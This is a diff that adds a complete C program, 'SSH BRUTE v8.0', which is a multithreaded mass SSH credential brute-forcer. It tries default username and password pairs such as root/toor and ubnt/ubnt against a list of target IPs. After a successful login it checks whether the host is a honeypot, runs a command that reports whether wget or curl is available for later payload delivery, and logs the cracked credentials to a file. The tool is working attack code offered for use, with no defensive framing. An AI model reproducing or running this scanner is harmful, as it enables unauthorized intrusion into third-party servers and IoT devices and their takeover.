@@ -1,0 +1,372 @@
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <errno.h>
+#include <signal.h>
+#include <stdatomic.h>
+#include <time.h>
+#include <ctype.h>
+#include <sys/resource.h>
+#include <semaphore.h>
+#include <net/if.h>
+#include <sys/ioctl.h>
+
+#include "rawssh.h"
+
+#define C_RESET "\033[0m"
+#define C_BOLD "\033[1m"
+#define C_BLUE "\033[94m"
+#define C_GREEN "\033[92m"
+#define C_YELLOW "\033[93m"
+#define C_WHITE "\033[97m"
+#define C_GRAY "\033[90m"
+#define C_ORANGE "\033[38;5;208m"
+#define C_RED "\033[91m"
+#define C_CYAN "\033[96m"
+#define CLEAR_SCREEN "\033[2J\033[H"
+#define HIDE_CURSOR "\033[?25l"
+#define SHOW_CURSOR "\033[?25h"
+
+#define SYSINFO "uname -a 2>/dev/null|head -c100;echo;command -v wget>/dev/null&&echo W||{ command -v curl>/dev/null&&echo C||echo N;}"
+
+static const char *U[]={"root","admin","user","ubnt","pi","test","guest","support"};
+static const char *P[]={"","root","admin","1234","12345","123456","password","toor","default","ubnt","user","test","guest","pass","admin123","changeme"};
+#define NU 8
+#define NP 16
+
+typedef struct{char ip[48];int port;}Target;
+typedef struct{char ip[48];int port;char user[32];char pass[32];int hp;char info[200];}Result;
+
+static Target *g_targets;
+static int g_ntargets;
+static Result *g_results;
+static int g_nresults,g_rescap;
+static pthread_mutex_t g_resmtx=PTHREAD_MUTEX_INITIALIZER;
+static pthread_mutex_t g_filemtx=PTHREAD_MUTEX_INITIALIZER;
+
+static atomic_int G_tested,G_found,G_real,G_hp;
+static atomic_int G_done,G_active,G_next;
+static atomic_int G_tcp_ok,G_tcp_err,G_ssh_ok,G_ssh_err,G_wrong;
+
+static int g_threads=200,g_timeout=5,g_maxconn=1000;
+static sem_t g_sem;
+static time_t g_start;
+static atomic_int g_run=1;
+static char g_nic[64]={0};
+
+static void raise_limits(){
+    struct rlimit r={1048576,1048576};
+    setrlimit(RLIMIT_NOFILE,&r);
+}
+
+/* Auto-detect first non-loopback NIC */
+static void detect_nic(){
+    if(g_nic[0]) return;
+
+    FILE *fp=fopen("/proc/net/dev","r");
+    if(!fp) return;
+
+    char line[256];
+    /* Skip header lines */
+    if(!fgets(line,sizeof(line),fp)){fclose(fp);return;}
+    if(!fgets(line,sizeof(line),fp)){fclose(fp);return;}
+
+    while(fgets(line,sizeof(line),fp)){
+        char *p=line;
+        while(*p && isspace(*p)) p++;
+        char *c=strchr(p,':');
+        if(!c) continue;
+        *c=0;
+        /* Skip loopback */
+        if(strcmp(p,"lo")==0) continue;
+        /* Check if interface is UP */
+        int sock=socket(AF_INET,SOCK_DGRAM,0);
+        if(sock<0) continue;
+        struct ifreq ifr;
+        memset(&ifr,0,sizeof(ifr));
+        strncpy(ifr.ifr_name,p,IFNAMSIZ-1);
+        if(ioctl(sock,SIOCGIFFLAGS,&ifr)==0){
+            if(ifr.ifr_flags & IFF_UP){
+                strncpy(g_nic,p,sizeof(g_nic)-1);
+                close(sock);
+                fclose(fp);
+                return;
+            }
+        }
+        close(sock);
+    }
+    fclose(fp);
+}
+
+static int load_targets(const char *f){
+    FILE *fp=fopen(f,"r");if(!fp)return 0;
+    int cap=500000;g_targets=malloc(cap*sizeof(Target));
+    char line[128];
+    while(fgets(line,sizeof(line),fp)){
+        char *p=line;while(*p&&isspace(*p))p++;if(!*p||*p=='#')continue;
+        char *e=p+strlen(p)-1;while(e>p&&isspace(*e))*e--=0;
+        if(g_ntargets>=cap){cap*=2;g_targets=realloc(g_targets,cap*sizeof(Target));}
+        char *c=strrchr(p,':');
+        if(c){*c=0;strncpy(g_targets[g_ntargets].ip,p,47);g_targets[g_ntargets].port=atoi(c+1);}
+        else{strncpy(g_targets[g_ntargets].ip,p,47);g_targets[g_ntargets].port=22;}
+        g_ntargets++;
+    }
+    fclose(fp);return g_ntargets;
+}
+
+static int ssh_exec_cmd(rawssh_session *ses,const char *cmd,char *out,int sz){
+    rawssh_channel *c=rawssh_channel_open(ses);
+    if(!c)return 0;
+    if(rawssh_channel_exec(c,cmd)!=RAWSSH_OK){
+        rawssh_channel_close(c);
+        rawssh_channel_free(c);
+        return 0;
+    }
+    int t=0,r;
+    char buf[256];
+    for(int i=0;i<50;i++){
+        r=rawssh_channel_read(c,buf,sizeof(buf)-1);
+        if(r>0&&t+r<sz){memcpy(out+t,buf,r);t+=r;}
+        else if(r<=0)break;
+    }
+    out[t]=0;
+    rawssh_channel_close(c);
+    rawssh_channel_free(c);
+    return t;
+}
+
+static int check_hp(rawssh_session *s){
+    char buf[128]={0};
+    ssh_exec_cmd(s,"ls -la /dev/null 2>/dev/null",buf,sizeof(buf));
+    if(buf[0]==0)return -1;
+    if(buf[0]=='c')return 0;
+    return 1;
+}
+
+static void get_info(rawssh_session *s,char *out,int sz){
+    char buf[256]={0};
+    ssh_exec_cmd(s,SYSINFO,buf,sizeof(buf));
+    for(int i=0;buf[i];i++)if(buf[i]=='\n')buf[i]=' ';
+    char *d=out,*p=buf;
+    while(*p){
+        while(*p==' '&&*(p+1)==' ')p++;
+        if(d-out<sz-1)*d++=*p;
+        p++;
+    }
+    *d=0;
+}
+
+static int try_auth(const char *ip,int port,const char *user,const char *pass,int *hp,char *info){
+    *hp=-1;info[0]=0;
+
+    sem_wait(&g_sem);
+
+    rawssh_session *ses=rawssh_session_new();
+    if(!ses){sem_post(&g_sem);return -1;}
+
+    rawssh_set_timeout(ses,g_timeout);
+    if(g_nic[0]) rawssh_bind_nic(ses,g_nic);
+
+    int rc=rawssh_connect(ses,ip,port);
+    if(rc!=RAWSSH_OK){
+        atomic_fetch_add(&G_tcp_err,1);
+        rawssh_session_free(ses);
+        sem_post(&g_sem);
+        return -1;
+    }
+    atomic_fetch_add(&G_tcp_ok,1);
+
+    rc=rawssh_handshake(ses);
+    if(rc!=RAWSSH_OK){
+        atomic_fetch_add(&G_ssh_err,1);
+        rawssh_disconnect(ses);
+        rawssh_session_free(ses);
+        sem_post(&g_sem);
+        return -1;
+    }
+    atomic_fetch_add(&G_ssh_ok,1);
+
+    rc=rawssh_auth_password(ses,user,pass);
+    if(rc!=RAWSSH_OK){
+        atomic_fetch_add(&G_wrong,1);
+        rawssh_disconnect(ses);
+        rawssh_session_free(ses);
+        sem_post(&g_sem);
+        return -1;
+    }
+
+    /* Login OK! */
+    *hp=check_hp(ses);
+    if(*hp<=0)get_info(ses,info,199);
+
+    rawssh_disconnect(ses);
+    rawssh_session_free(ses);
+    sem_post(&g_sem);
+    return 0;
+}
+
+static void save_result(Result *r){
+    pthread_mutex_lock(&g_resmtx);
+    if(g_nresults>=g_rescap){
+        g_rescap=g_rescap?g_rescap*2:256;
+        g_results=realloc(g_results,g_rescap*sizeof(Result));
+    }
+    g_results[g_nresults++]=*r;
+    pthread_mutex_unlock(&g_resmtx);
+
+    pthread_mutex_lock(&g_filemtx);
+    const char *fn=(r->hp==1)?"honeypots.txt":"valid_linux.txt";
+    FILE *fp=fopen(fn,"a");
+    if(fp){
+        fprintf(fp,"%s:%d %s:%s",r->ip,r->port,r->user,r->pass);
+        if(r->info[0])fprintf(fp," | %s",r->info);
+        fprintf(fp,"\n");
+        fclose(fp);
+    }
+    pthread_mutex_unlock(&g_filemtx);
+}
+
+static void process(int idx){
+    Target *t=&g_targets[idx];
+    atomic_fetch_add(&G_active,1);
+
+    for(int u=0;u<NU;u++){
+        for(int p=0;p<NP;p++){
+            atomic_fetch_add(&G_tested,1);
+            int hp;char info[200]={0};
+            if(try_auth(t->ip,t->port,U[u],P[p],&hp,info)==0){
+                atomic_fetch_add(&G_found,1);
+                if(hp==1)atomic_fetch_add(&G_hp,1);
+                else atomic_fetch_add(&G_real,1);
+
+                Result r={.port=t->port,.hp=hp};
+                strncpy(r.ip,t->ip,47);
+                strncpy(r.user,U[u],31);
+                strncpy(r.pass,P[p],31);
+                strncpy(r.info,info,199);
+                save_result(&r);
+                goto done;
+            }
+        }
+    }
+done:
+    atomic_fetch_sub(&G_active,1);
+    atomic_fetch_add(&G_done,1);
+}
+
+static void draw(){
+    int el=(int)(time(NULL)-g_start);if(el<1)el=1;
+    int done=atomic_load(&G_done),act=atomic_load(&G_active);
+    int tested=atomic_load(&G_tested),found=atomic_load(&G_found);
+    int real=atomic_load(&G_real),hp=atomic_load(&G_hp);
+    int tcp_ok=atomic_load(&G_tcp_ok),tcp_err=atomic_load(&G_tcp_err);
+    int ssh_ok=atomic_load(&G_ssh_ok),ssh_err=atomic_load(&G_ssh_err);
+    int wrong=atomic_load(&G_wrong);
+    float pct=g_ntargets?(done*100.0f/g_ntargets):0;
+    int spd=tested*60/el;
+    int ips=done/el;
+
+    printf(CLEAR_SCREEN);
+    printf("\n  %s%sSSH BRUTE v8.0 [RawSSH]%s  %d threads | %ds timeout | max %d conn",
+           C_BOLD,C_CYAN,C_RESET,g_threads,g_timeout,g_maxconn);
+    if(g_nic[0])printf(" | NIC: %s%s%s",C_GREEN,g_nic,C_RESET);
+    printf("\n\n");
+    printf("  %sProgress:%s %d/%d (%s%.1f%%%s)  %sActive:%s %d  %sSpeed:%s %d/min  %sIPs/s:%s %d\n",
+           C_YELLOW,C_RESET,done,g_ntargets,C_GREEN,pct,C_RESET,
+           C_YELLOW,C_RESET,act,C_YELLOW,C_RESET,spd,C_YELLOW,C_RESET,ips);
+    printf("  %sTime:%s %02d:%02d  %sFound:%s %s%d%s  %sReal:%s %s%d%s  %sHP:%s %s%d%s\n\n",
+           C_YELLOW,C_RESET,el/60,el%60,
+           C_BOLD,C_RESET,C_GREEN,found,C_RESET,
+           C_BOLD,C_RESET,C_GREEN,real,C_RESET,
+           C_BOLD,C_RESET,C_ORANGE,hp,C_RESET);
+
+    int tcp_tot=tcp_ok+tcp_err;
+    int ssh_tot=ssh_ok+ssh_err;
+    printf("  %sTCP:%s %d/%d (%.0f%% ok)  %sSSH:%s %d/%d (%.0f%% ok)  %sWrong:%s %d\n\n",
+           C_GRAY,C_RESET,tcp_ok,tcp_tot,tcp_tot?(tcp_ok*100.0f/tcp_tot):0,
+           C_GRAY,C_RESET,ssh_ok,ssh_tot,ssh_tot?(ssh_ok*100.0f/ssh_tot):0,
+           C_GRAY,C_RESET,wrong);
+
+    pthread_mutex_lock(&g_resmtx);
+    int st=(g_nresults>8)?g_nresults-8:0;
+    for(int i=st;i<g_nresults;i++){
+        Result *r=&g_results[i];
+        const char *tag=r->hp==1?"[HP]":(r->hp==0?"[OK]":"[??]");
+        const char *col=r->hp==1?C_ORANGE:(r->hp==0?C_GREEN:C_YELLOW);
+        printf("  %s%s%s %s:%d %s%s%s:%s%s%s\n",
+               col,tag,C_RESET,r->ip,r->port,
+               C_WHITE,r->user,C_RESET,C_YELLOW,r->pass,C_RESET);
+        if(r->hp!=1&&r->info[0])
+            printf("       %s%s%s\n",C_GRAY,r->info,C_RESET);
+    }
+    pthread_mutex_unlock(&g_resmtx);
+    printf("\n");fflush(stdout);
+}
+
+static void *panel_fn(void *_){(void)_;while(atomic_load(&g_run)){draw();usleep(500000);}draw();return NULL;}
+static void *worker_fn(void *_){(void)_;int i;while((i=atomic_fetch_add(&G_next,1))<g_ntargets)process(i);return NULL;}
+
+int main(int argc,char **argv){
+    signal(SIGPIPE,SIG_IGN);
+
+    for(int i=1;i<argc;i++){
+        if(!strcmp(argv[i],"-t"))g_threads=atoi(argv[++i]);
+        else if(!strcmp(argv[i],"-T"))g_timeout=atoi(argv[++i]);
+        else if(!strcmp(argv[i],"-c"))g_maxconn=atoi(argv[++i]);
+        else if(!strcmp(argv[i],"-i"))strncpy(g_nic,argv[++i],sizeof(g_nic)-1);
+        else if(!strcmp(argv[i],"-h")){
+            printf("Usage: %s [-t threads] [-T timeout] [-c max_conn] [-i nic]\n",argv[0]);
+            printf("  -t  Threads (default: 200)\n");
+            printf("  -T  Timeout (default: 5)\n");
+            printf("  -c  Max connections (default: 1000)\n");
+            printf("  -i  Network interface to bind (auto-detect if omitted)\n");
+            return 0;
+        }
+    }
+
+    raise_limits();
+    detect_nic();
+
+    if(!load_targets("ssh.txt")){printf("Need ssh.txt\n");return 1;}
+
+    sem_init(&g_sem,0,g_maxconn);
+    rawssh_global_init();
+
+    printf(HIDE_CURSOR);
+    g_start=time(NULL);
+
+    pthread_attr_t attr;
+    pthread_attr_init(&attr);
+    pthread_attr_setstacksize(&attr,64*1024);
+
+    pthread_t panel;
+    pthread_create(&panel,NULL,panel_fn,NULL);
+
+    pthread_t *pool=malloc(g_threads*sizeof(pthread_t));
+    int n=0;
+    for(int i=0;i<g_threads;i++)
+        if(!pthread_create(&pool[i],&attr,worker_fn,NULL))n++;
+
+    for(int i=0;i<n;i++)pthread_join(pool[i],NULL);
+
+    atomic_store(&g_run,0);
+    usleep(600000);
+    pthread_join(panel,NULL);
+
+    printf(SHOW_CURSOR);
+    printf("\n  %sDONE!%s Found: %d (Real: %d, HP: %d)\n",
+           C_BOLD,C_RESET,atomic_load(&G_found),atomic_load(&G_real),atomic_load(&G_hp));
+    if(atomic_load(&G_real)||atomic_load(&G_hp)==0)
+        printf("  %s> valid_linux.txt%s\n",C_GREEN,C_RESET);
+    if(atomic_load(&G_hp))
+        printf("  %s> honeypots.txt%s\n",C_ORANGE,C_RESET);
+    printf("\n");
+
+    sem_destroy(&g_sem);
+    free(pool);free(g_targets);free(g_results);
+    rawssh_global_cleanup();
+    return 0;
+}
